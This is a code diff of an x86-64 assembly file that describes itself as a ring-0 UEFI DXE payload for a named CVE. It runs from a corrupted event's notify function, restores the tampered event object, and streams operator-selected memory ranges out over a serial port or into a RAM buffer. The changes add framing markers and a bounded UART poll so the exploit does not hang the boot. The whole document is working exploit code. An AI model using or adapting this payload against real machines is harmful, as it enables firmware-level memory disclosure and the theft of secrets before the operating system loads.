@@ -1,23 +1,29 @@
-; payload.S - ring-0 DXE payload for CVE-2026-97631 (GHSA-99cj-7hg9-mp4m)
-;
-; Entered as NotifyFunction(EFI_EVENT Event /*rcx*/, VOID *Context /*rdx*/)
-; from CoreSignalEvent() at TPL_HIGH_LEVEL, inside the DXE core, on the
-; firmware's own stack.
-;
-; Rules this payload lives by:
-;
-;   * no Boot Services call that allocates, logs, or takes a lock
-;   * no IDT/GDT/CR/MSR edits, no interrupt hooks, no debug registers
-;   * touch only our own parameter block, the IEVENT we already own, and the
-;     memory the operator explicitly asked for
-;   * rebuild the IEVENT from the pre-corruption snapshot *before* doing any
-;     work, so the object returns to its pre-attack state while the dump runs
-;   * return EFI_SUCCESS and let the firmware finish booting
-;
-; Output is polled 16550-compatible UART (no interrupts, no firmware buffers)
-; and/or an operator-supplied RAM sink.
-;
-; Intel syntax, Microsoft x64 ABI, position independent, no relocations.
+# payload.S - ring-0 DXE payload for CVE-2026-97631 (GHSA-99cj-7hg9-mp4m)
+#
+# Entered as NotifyFunction(EFI_EVENT Event /*rcx*/, VOID *Context /*rdx*/)
+# from CoreSignalEvent() at TPL_HIGH_LEVEL, inside the DXE core, on the
+# firmware's own stack.
+#
+# Rules this payload lives by:
+#
+#   * no Boot Services call that allocates, logs, or takes a lock
+#   * no IDT/GDT/CR/MSR edits, no interrupt hooks, no debug registers
+#   * touch only our own parameter block, the IEVENT we already own, and the
+#     memory the operator explicitly asked for
+#   * put the IEVENT back from its pristine snapshot *before* doing any work,
+#     so the object is already clean while the dump runs
+#   * return EFI_SUCCESS and let the firmware finish booting
+#
+# Output is polled 16550-compatible UART (no interrupts, no firmware buffers)
+# and/or an operator-supplied RAM sink.
+#
+# Stream format, all 64-bit fields most-significant byte first:
+#
+#   C0 DE <event> <graft>              open
+#   C1 <start> <end> <data...>         one per range, end exclusive
+#   C0 DE <event> <graft>              close, only if we got to the end
+#
+# Intel syntax, Microsoft x64 ABI, position independent, no relocations.
 
         .intel_syntax noprefix
         .text
@@ -48,16 +54,15 @@ payload_start:
         push    r15
         pushfq
 
-        mov     r15, rcx                    ; Event
-        mov     r14, rdx                    ; parameter block
+        mov     r14, rdx                    # parameter block
         test    r14, r14
         jz      .Lret_ok
 
-        mov     rax, 0x504d4b4f312d4445     ; "ED-1OKMP" (DE AD BE EF style tag)
+        mov     rax, 0x504d4b4f312d4445     # "ED-1OKMP"
         cmp     qword ptr [r14 + PP_MAGIC], rax
         jne     .Lret_ok
 
-        ; ---- put the IEVENT back exactly as it was ----------------------
+        # ---- restore the IEVENT from its pristine copy ------------------
         mov     rsi, qword ptr [r14 + PP_SHADOW]
         mov     rdi, qword ptr [r14 + PP_EVT]
         test    rsi, rsi
@@ -68,7 +73,7 @@ payload_start:
         rep movsb
 .Lno_shadow:
 
-        ; ---- resolve sinks ---------------------------------------------
+        # ---- resolve sinks ---------------------------------------------
         mov     r12, qword ptr [r14 + PP_UART]
         mov     r13, qword ptr [r14 + PP_UART_STRIDE]
         test    r13, r13
@@ -80,12 +85,12 @@ payload_start:
         jz      .Lno_mem
         mov     r11, qword ptr [r14 + PP_OUT_CAP]
         add     r11, r10
-        jmp     .Lbanner
+        jmp     .Lopen
 .Lno_mem:
         xor     r11d, r11d
 
-        ; ---- banner: 0xC0DE, Event, Graft ------------------------------
-.Lbanner:
+        # ---- open frame -------------------------------------------------
+.Lopen:
         mov     al, 0xc0
         call    .Lemit
         mov     al, 0xde
@@ -95,38 +100,57 @@ payload_start:
         mov     rax, qword ptr [r14 + PP_GST]
         call    .Lemitq
 
-        ; ---- walk the ranges -------------------------------------------
+        # ---- ranges -----------------------------------------------------
         mov     rbx, qword ptr [r14 + PP_RANGES]
         mov     rbp, qword ptr [r14 + PP_RANGE_N]
         test    rbx, rbx
-        jz      .Ltrailer
+        jz      .Lclose
         test    rbp, rbp
-        jz      .Ltrailer
+        jz      .Lclose
 
 .Lrange_loop:
-        mov     rsi, qword ptr [rbx]        ; start
-        mov     rdi, qword ptr [rbx + 8]    ; end, exclusive
+        mov     rsi, qword ptr [rbx]        # start
+        mov     rdi, qword ptr [rbx + 8]    # end, exclusive
+        add     rbx, 16
         cmp     rdi, rsi
         jbe     .Lnext_range
+
+        push    rbx                         # block header
+        push    rdi
+        mov     al, 0xc1
+        call    .Lemit
+        mov     rax, rsi
+        call    .Lemitq
+        pop     rax                         # end
+        push    rax
+        call    .Lemitq
+        pop     rdi
+        pop     rbx
+
 .Lcopy_loop:
         mov     rax, qword ptr [rsi]
         call    .Lemitq
         add     rsi, 8
         cmp     rsi, rdi
         jb      .Lcopy_loop
+
 .Lnext_range:
-        add     rbx, 16
         dec     rbp
         jnz     .Lrange_loop
 
-.Ltrailer:
-        mov     al, 0x0d
+        # ---- close frame: proves the whole dump was written --------------
+.Lclose:
+        mov     al, 0xc0
         call    .Lemit
-        mov     al, 0x0a
+        mov     al, 0xde
         call    .Lemit
+        mov     rax, qword ptr [r14 + PP_EVT]
+        call    .Lemitq
+        mov     rax, qword ptr [r14 + PP_GST]
+        call    .Lemitq
 
 .Lret_ok:
-        xor     eax, eax                    ; EFI_SUCCESS
+        xor     eax, eax                    # EFI_SUCCESS
         popfq
         pop     r15
         pop     r14
@@ -138,24 +162,36 @@ payload_start:
         pop     rbx
         ret
 
-; ---------------------------------------------------------------------------
-; .Lemit   AL -> UART then RAM sink.  Preserves RAX/RCX/RDX.
-; .Lemitq  RAX -> 8 bytes big-endian.  Preserves all general registers.
-; ---------------------------------------------------------------------------
+# ---------------------------------------------------------------------------
+# .Lemit   AL -> UART then RAM sink.  Preserves RAX/RCX/RDX/R8.
+# .Lemitq  RAX -> 8 bytes big-endian.  Preserves all general registers.
+#
+# The UART poll is bounded: a board whose "COM1" is not a working 16550 would
+# otherwise spin forever at TPL_HIGH inside CoreSignalEvent and hang the boot.
+# After the budget runs out the UART is dropped for the rest of the run and the
+# payload carries on with the RAM sink (or with nothing, and just returns).
+# ---------------------------------------------------------------------------
 .Lemit:
         push    rax
         push    rcx
         push    rdx
+        push    r8
         test    r12, r12
         jz      .Le_mem
         mov     rdx, r12
-        add     rdx, 5                      ; LSR
+        add     rdx, 5                      # LSR
+        mov     r8d, 0x8000                 # poll budget
 .Le_txw:
         movzx   ecx, byte ptr [rdx]
-        test    cl, 0x20                    ; THRE
-        jz      .Le_txw
+        test    cl, 0x20                    # THRE
+        jnz     .Le_tx_ok
+        dec     r8d
+        jnz     .Le_txw
+        xor     r12d, r12d                  # UART unresponsive: give up on it
+        jmp     .Le_mem
+.Le_tx_ok:
         mov     rcx, r12
-        mov     byte ptr [rcx], al          ; THR
+        mov     byte ptr [rcx], al          # THR
 .Le_mem:
         test    r10, r10
         jz      .Le_out
@@ -164,6 +200,7 @@ payload_start:
         mov     byte ptr [r10], al
         inc     r10
 .Le_out:
+        pop     r8
         pop     rdx
         pop     rcx
         pop     rax
@@ -173,15 +210,17 @@ payload_start:
         push    rax
         push    rcx
         push    rdx
+        push    r8
         mov     rdx, rax
         mov     ecx, 8
 .Lq_loop:
-        rol     rdx, 8                      ; MSB into AL
+        rol     rdx, 8                      # MSB into AL
         mov     rax, rdx
         movzx   eax, al
         call    .Lemit
         dec     ecx
         jnz     .Lq_loop
+        pop     r8
         pop     rdx
         pop     rcx
         pop     rax
